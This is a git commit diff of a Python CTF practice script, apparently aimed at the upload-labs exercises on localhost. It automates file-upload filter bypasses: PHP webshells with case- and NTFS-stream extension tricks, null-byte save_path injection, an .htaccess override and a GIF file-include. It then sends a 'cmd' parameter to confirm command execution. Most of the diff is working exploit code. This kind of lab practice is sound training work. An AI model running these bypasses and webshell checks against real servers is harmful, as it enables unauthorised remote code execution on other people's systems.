ad337206a4d5e248a5b59840acff824867c3b0c7
wgf4242_notebook <wgf4242@gmail.com>
2023-06-30 08:54:21 +0800

    sync

--- docs/ctf/scripts/shell/upload_framework.py
+++ docs/ctf/scripts/shell/upload_framework.py
@@ -1,7 +1,11 @@
 """
-可能要更新索引 post_files[key0]
-配置 xpath 提取上期文件路径
+1. 可能要更新索引 post_files[key0]
+2. 配置 xpath 提取上期文件路径
+需要修改
+3. upload4_percent00_pass11 可能需要修改对应参数
+4. upload5_pass12
 """
+import inspect
 from urllib.parse import urlparse
 
 from requests_html import HTMLSession
@@ -17,7 +21,7 @@ def extract_upload_url(regexp):
     return regexp
 
 
-url = 'http://localhost/Pass-08/index.php'
+url = 'http://localhost/Pass-15/index.php'
 host = _get_host(url)
 upload_folder = 'upload'
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080', }
@@ -49,8 +53,11 @@ class FuzzUpload:
                 print('没有上传成功')
         return res
 
-    def check(self, shell_path, check_str='Hello 123'):
-        tmp_url = self.get_upload_url(shell_path)
+    def check(self, shell_path, check_str='Hello 123', absolute=False):
+        if absolute:
+            tmp_url = shell_path
+        else:
+            tmp_url = self.get_upload_url(shell_path)
 
         data = {'cmd': f'echo "{check_str}";'}
         res = self.requests.post(tmp_url, data=data, proxies=proxies, verify=False)
@@ -88,6 +95,7 @@ class FuzzUpload:
         self.check(self.upload_url or file_path, 'GIF89a')
 
     def upload1_basic(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
         file_path = 'basic.PHp'
         post_files = self._update_file_fp(file_path)
         post_data = data.copy()
@@ -98,18 +106,25 @@ class FuzzUpload:
             print('error ', file_path)
 
     def upload2_php5_phtml(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+        fmap = {'Php::$DATA': 'Php'}
         filename = 'basic.PHp'
-        ext_lst = 'PHP,Php::$DATA,pHP,pHP.,pHP ,pHP. .,pHP3,pHP4,pHP5,pHP%00.jpg,phtml'.split(',')  # "basic.pHP .jpg"
+        ext_lst = 'PHP,Php::$DATA,pphphp,pHP,pHP.,pHP ,pHP. .,pHP3,pHP4,pHP5,pHP%00.jpg,phtml'.split(
+            ',')  # "basic.pHP .jpg"
+        ext_lst = 'pHP%00.jpg,phtml'.split(',')  # "basic.pHP .jpg"
         for ext in ext_lst:
             newname = f'basic.{ext}'
             post_files = self._update_file_fp(filename, filename=newname)
             post_data = data.copy()
             res = self.send_request(url=url, files=post_files, data=post_data)
-            if self.check(self.upload_url or newname):
+            if self.check(self.upload_url and self.upload_url.rstrip('::$data') or newname):
+                print('success ext is ', ext)
                 return
         return
 
     def upload3_htaccess(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+
         file_path = '.htaccess'
         post_files = self._update_file_fp(file_path, filename=file_path)
         post_data = data.copy()
@@ -119,10 +134,46 @@ class FuzzUpload:
         res = self.send_request(url=url, files=post_files, data=post_data)
         self.check('basic.gif')
 
+    def upload4_percent00_pass11(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+        file_path = 'basic.gif'
+        post_files = self._update_file_fp(file_path, file_path)
+        post_data = data.copy()
+        url1 = url + '?save_path=../upload/55.pHP%00.jpg'
+        try:
+            res = self.send_request(url=url1, files=post_files, data=post_data)
+            self.check(self.upload_url or file_path)
+        except Exception as e:
+            print('error ', file_path)
+
+    def upload5_pass12(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+        file_path = 'basic.gif'
+        post_files = self._update_file_fp(file_path, file_path)
+        post_data = data.copy()
+        post_data['save_path'] = '../upload/basic.php\x00'
+        try:
+            res = self.send_request(url=url, files=post_files, data=post_data)
+            self.check(self.upload_url or file_path)
+        except Exception as e:
+            print('error ', file_path)
+
+    def upload5_pass13_file_include_gif(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+        file_path = 'basic.gif'
+        post_files = self._update_file_fp(file_path, file_path)
+        post_data = data.copy()
+        res = self.send_request(url=url, files=post_files, data=post_data)
+        url1 = _get_host(url) + f'/include.php?file=any/{self.upload_url}'
+        self.check(url1, absolute=True)
+
 
 if __name__ == '__main__':
     fuzz_upload = FuzzUpload()
-    fuzz_upload.upload0_normal_check()
-    fuzz_upload.upload1_basic()
-    fuzz_upload.upload2_php5_phtml()
-    fuzz_upload.upload3_htaccess()
+    # fuzz_upload.upload0_normal_check()
+    # fuzz_upload.upload1_basic()
+    # fuzz_upload.upload2_php5_phtml()
+    # fuzz_upload.upload3_htaccess()
+    # fuzz_upload.upload4_percent00_pass11()
+    # fuzz_upload.upload5_pass12()
+    fuzz_upload.upload5_pass13_file_include_gif()
